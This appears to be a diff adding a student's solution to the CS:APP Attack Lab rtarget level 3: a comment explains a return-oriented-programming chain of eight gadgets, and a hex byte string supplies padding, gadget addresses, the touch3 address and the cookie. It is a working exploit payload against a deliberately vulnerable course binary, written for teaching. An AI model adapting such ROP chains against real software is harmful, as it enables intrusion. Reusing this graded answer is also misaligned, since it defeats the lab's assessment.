@@ -1,0 +1,43 @@
+/*
+ * This level is a bit complicated, but really not challenging. You only need
+ * to be attentive to the gadget farm. Certainly there are many tools to help
+ * you quickly find all the gadgets you can exploit, such as ROPgadget from
+ * Jonathan Salwan. It is integrated to pwndgb, a powerful Python extension of
+ * vanilla GDB. You can use the command below to print all latent gadgets among
+ * the farm:
+ *
+ *   rop --grep ": (mov|pop|and|or|cmp|test|add).+ret$" -- --range
+ *   0x40199a-0x401ab1
+ *
+ * Note that this command will print the gadgets with `add` instruction, which
+ * is not covered in the writeup. There is such gadget to apply an offset to
+ * certain register, hence you can try on your own. Another way to do something
+ * similar is to call add_xy() which is the only function in the gadget farm
+ * with a noticeable comment. Therefore, we can use it to get the shifted %rsp.
+ * This way has one more advantage over `add` is that it doesn't really change
+ * the value of %rsp, which is as helpful as what is depicted below.
+ *
+ * This solution doesn't use any `add`, comprising 8 gadgets exactly as same as
+ * that in writeup. A straightforward approach to reach the goal is to put the
+ * cookie string somewhere, and pass its address to %rdi. In the ctarget level 3
+ * I put the string into ".data" section which is accessible and writable. It is
+ * impossible in this level due to the limitation of executing any code we
+ * provide. So we can just store the string after the last return address (that
+ * is, the address of touch3()) without being overwritten, for it is possible to
+ * keep the affected memory area of succeeding function calls far from it by
+ * fixing the value of %rsp. By contrast, we can't exploit an instruction to
+ * move something to the *pointed address* of a register, otherwise we may put
+ * the string elsewhere.
+ *
+ * Now it is the time to show the exploited gadgets (`ret` and other place-
+ * holders are omitted):
+ *   0x401a06 | movq %rsp, %rax
+ *   0x4019a2 | movq %rax, %rdi
+ *   0x4019ab | popq %rax
+ *   0x4019dd | movl %eax, %edx
+ *   0x401a34 | movl %edx, %ecx
+ *   0x401a27 | movl %ecx, %esi
+ *   0x4019d6 | (call of add_xy())
+ *   0x4019a2 | movq %rax, %rdi
+ */
+01 01 01 01 01 01 01 01 01 01 01 01 01 01 01 01 01 01 01 01 01 01 01 01 01 01 01 01 01 01 01 01 01 01 01 01 01 01 01 01 06 1A 40 00 00 00 00 00 A2 19 40 00 00 00 00 00 AB 19 40 00 00 00 00 00 48 00 00 00 00 00 00 00 DD 19 40 00 00 00 00 00 34 1A 40 00 00 00 00 00 27 1A 40 00 00 00 00 00 D6 19 40 00 00 00 00 00 A2 19 40 00 00 00 00 00 FA 18 40 00 00 00 00 00 35 39 62 39 39 37 66 61 00
